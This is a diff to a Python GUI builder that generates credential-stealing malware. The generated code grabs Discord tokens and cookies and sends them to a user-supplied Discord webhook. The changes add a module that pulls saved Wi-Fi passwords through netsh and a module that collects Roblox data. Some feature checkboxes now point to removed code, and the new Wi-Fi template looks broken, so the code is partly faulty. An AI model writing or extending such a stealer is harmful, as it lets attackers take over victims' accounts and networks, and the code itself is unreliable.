@@ -4,6 +4,8 @@ import os
 import requests
 import sqlite3
 import winreg as reg
+import subprocess  # for Wi-Fi info
+import json
 
 def generate_code(selected_features, webhook_url, image_path):
     """Generates Python code based on selected features."""
@@ -16,6 +18,7 @@ import json
 import re
 import sqlite3
 import winreg as reg
+import subprocess  # For Wi-Fi info
 
 # Discord webhook URL
 WEBHOOK_URL = '{webhook_url}'
@@ -62,6 +65,7 @@ def get_cookies():
     '''Retrieve cookies from local storage'''
     cookies = {{}}
     paths = {{
+
         "Discord": os.path.join(os.getenv('APPDATA'), "discord", "Local Storage"),
         "Discord Canary": os.path.join(os.getenv('APPDATA'), "discordcanary", "Local Storage"),
         "Discord PTB": os.path.join(os.getenv('APPDATA'), "discordptb", "Local Storage")
@@ -81,78 +85,45 @@ def get_cookies():
             continue
     return cookies
 """
-    if 'Minecraft Info' in selected_features:
+    if 'WiFi Info' in selected_features:
         code += """
-def get_minecraft_info():
-    '''Gather Minecraft-related information'''
-    info = {{}}
+def get_wifi_info():
+    '''Retrieve Wi-Fi information from the system'''
+    wifi_info = []
     try:
-        minecraft_dir = os.path.join(os.getenv('APPDATA'), ".minecraft")
-        if os.path.exists(minecraft_dir):
-            info["Minecraft Directory"] = minecraft_dir
+        # Using netsh command to get Wi-Fi profiles
+        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
+        profiles = [line.split(":")[1][1:-1] for line in result.stdout.splitlines() if "All User Profile" in line]
+        for profile in profiles:
+            wifi = {"SSID": profile}
+            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile], capture_output=True, text=True)
+            for line in result.stdout.splitlines():
+                if "Key Content" in line:
+                    wifi["Password"] = line.split(":")[1][1:-1]
+            wifi_info.append(wifi)
     except Exception as e:
-        print(f"Error gathering Minecraft info: {e}")
-    return info
+        print(f"Error retrieving Wi-Fi info: {e}")
+    return wifi_info
 """
-    if 'Valorant Info' in selected_features:
+    if 'Roblox Info' in selected_features:
         code += """
-def get_valorant_info():
-    '''Gather Valorant-related information'''
-    info = {{}}
+def get_roblox_info():
+    '''Retrieve Roblox-related information'''
+    roblox_info = {{}}
     try:
-        valorant_dir = os.path.join(os.getenv('APPDATA'), "Riot Games", "VALORANT")
-        if os.path.exists(valorant_dir):
-            info["Valorant Directory"] = valorant_dir
-    except Exception as e:
-        print(f"Error gathering Valorant info: {e}")
-    return info
-"""
-
-    if 'Steam Info' in selected_features:
-        code += """
-def get_steam_info():
-    '''Retrieve Steam installation path and installed games'''
-    steam_info = {{}}
-    try:
-        # Check the registry for the Steam install path
-        reg_path = r"SOFTWARE\\WOW6432Node\\Valve\\Steam"
+        roblox_path = os.path.join(os.getenv('APPDATA'), 'Roblox')
+        if os.path.exists(roblox_path):
+            roblox_info["Roblox Directory"] = roblox_path
+        # Try getting Roblox registry information (if available)
+        reg_path = r"SOFTWARE\\WOW6432Node\\Roblox"
         registry_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, reg_path)
-        steam_path, _ = reg.QueryValueEx(registry_key, "InstallPath")
-        steam_info["Steam Installation Path"] = steam_path
+        install_path, _ = reg.QueryValueEx(registry_key, "InstallPath")
+        roblox_info["Roblox Installation Path"] = install_path
         reg.CloseKey(registry_key)
-
-        # Check the Steam installation directory for installed games
-        games = []
-        for game_dir in os.listdir(steam_path + "\\steamapps"):
-            if game_dir.endswith(".acf"):
-                games.append(game_dir)
-        steam_info["Installed Games"] = games
     except Exception as e:
-        print(f"Error gathering Steam info: {e}")
-    return steam_info
+        print(f"Error gathering Roblox info: {e}")
+    return roblox_info
 """
-
-    if 'Epic Games Info' in selected_features:
-        code += """
-def get_epic_games_info():
-    '''Retrieve Epic Games installation path and installed games'''
-    epic_info = {{}}
-    try:
-        # Epic Games store installation path
-        epic_path = os.path.join(os.getenv('PROGRAMFILES(X86)'), 'Epic Games')
-        epic_info["Epic Games Installation Path"] = epic_path
-
-        # Check for installed games
-        games = []
-        for game_dir in os.listdir(epic_path):
-            if os.path.isdir(os.path.join(epic_path, game_dir)):
-                games.append(game_dir)
-        epic_info["Installed Games"] = games
-    except Exception as e:
-        print(f"Error gathering Epic Games info: {e}")
-    return epic_info
-"""
-
     if image_path:
         code += f"""
 def send_image():
@@ -180,6 +151,10 @@ def on_build_button_click():
         selected_features.append('System Info')
     if discord_info_var.get():
         selected_features.append('Discord Info')
+    if wifi_info_var.get():
+        selected_features.append('WiFi Info')
+    if roblox_info_var.get():
+        selected_features.append('Roblox Info')
     if minecraft_info_var.get():
         selected_features.append('Minecraft Info')
     if valorant_info_var.get():
@@ -220,6 +195,8 @@ title_label.grid(row=0, column=0, columnspan=3, pady=20)
 # Feature selection checkboxes (arranged in a grid layout)
 system_info_var = tk.BooleanVar()
 discord_info_var = tk.BooleanVar()
+wifi_info_var = tk.BooleanVar()
+roblox_info_var = tk.BooleanVar()
 minecraft_info_var = tk.BooleanVar()
 valorant_info_var = tk.BooleanVar()
 steam_info_var = tk.BooleanVar()
@@ -227,6 +204,8 @@ epic_games_info_var = tk.BooleanVar()
 
 system_info_check = tk.Checkbutton(root, text="System Info", variable=system_info_var, fg="white", bg="black", selectcolor="purple")
 discord_info_check = tk.Checkbutton(root, text="Discord Info", variable=discord_info_var, fg="white", bg="black", selectcolor="purple")
+wifi_info_check = tk.Checkbutton(root, text="Wi-Fi Info", variable=wifi_info_var, fg="white", bg="black", selectcolor="purple")
+roblox_info_check = tk.Checkbutton(root, text="Roblox Info", variable=roblox_info_var, fg="white", bg="black", selectcolor="purple")
 minecraft_info_check = tk.Checkbutton(root, text="Minecraft Info", variable=minecraft_info_var, fg="white", bg="black", selectcolor="purple")
 valorant_info_check = tk.Checkbutton(root, text="Valorant Info", variable=valorant_info_var, fg="white", bg="black", selectcolor="purple")
 steam_info_check = tk.Checkbutton(root, text="Steam Info", variable=steam_info_var, fg="white", bg="black", selectcolor="purple")
@@ -234,36 +213,38 @@ epic_games_info_check = tk.Checkbutton(root, text="Epic Games Info", variable=ep
 
 system_info_check.grid(row=1, column=0, padx=20, pady=10)
 discord_info_check.grid(row=2, column=0, padx=20, pady=10)
-minecraft_info_check.grid(row=1, column=1, padx=20, pady=10)
-valorant_info_check.grid(row=2, column=1, padx=20, pady=10)
-steam_info_check.grid(row=1, column=2, padx=20, pady=10)
-epic_games_info_check.grid(row=2, column=2, padx=20, pady=10)
+wifi_info_check.grid(row=1, column=1, padx=20, pady=10)
+roblox_info_check.grid(row=2, column=1, padx=20, pady=10)
+minecraft_info_check.grid(row=1, column=2, padx=20, pady=10)
+valorant_info_check.grid(row=2, column=2, padx=20, pady=10)
+steam_info_check.grid(row=3, column=0, padx=20, pady=10)
+epic_games_info_check.grid(row=3, column=1, padx=20, pady=10)
 
 # Webhook URL entry
 webhook_label = tk.Label(root, text="Enter Webhook URL:", fg="white", bg="black", font=("Helvetica", 12))
-webhook_label.grid(row=3, column=0, columnspan=3, pady=10)
+webhook_label.grid(row=4, column=0, columnspan=3, pady=10)
 
 webhook_entry = tk.Entry(root, width=50, fg="black", bg="white", font=("Helvetica", 12))
-webhook_entry.grid(row=4, column=0, columnspan=3, pady=10)
+webhook_entry.grid(row=5, column=0, columnspan=3, pady=10)
 
 # Select image button
 select_image_button = tk.Button(root, text="Select Image", command=on_select_image_button_click, fg="white", bg="purple", font=("Helvetica", 14))
-select_image_button.grid(row=5, column=0, columnspan=3, pady=10)
+select_image_button.grid(row=6, column=0, columnspan=3, pady=10)
 
 # Image path label
 image_path_label = tk.Label(root, text="No image selected", fg="white", bg="black", font=("Helvetica", 12))
-image_path_label.grid(row=6, column=0, columnspan=3, pady=5)
+image_path_label.grid(row=7, column=0, columnspan=3, pady=5)
 
 # Build button
 build_button = tk.Button(root, text="Build", command=on_build_button_click, fg="white", bg="purple", font=("Helvetica", 14))
-build_button.grid(row=7, column=0, columnspan=3, pady=20)
+build_button.grid(row=8, column=0, columnspan=3, pady=20)
 
 # Code output area
 code_output_label = tk.Label(root, text="Generated Code:", fg="white", bg="black", font=("Helvetica", 12))
-code_output_label.grid(row=8, column=0, columnspan=3, pady=10)
+code_output_label.grid(row=9, column=0, columnspan=3, pady=10)
 
 code_output = tk.Text(root, width=70, height=10, wrap=tk.WORD, fg="black", bg="white", font=("Courier", 10))
-code_output.grid(row=9, column=0, columnspan=3, pady=10)
+code_output.grid(row=10, column=0, columnspan=3, pady=10)
 
 # Start the GUI loop
 root.mainloop()
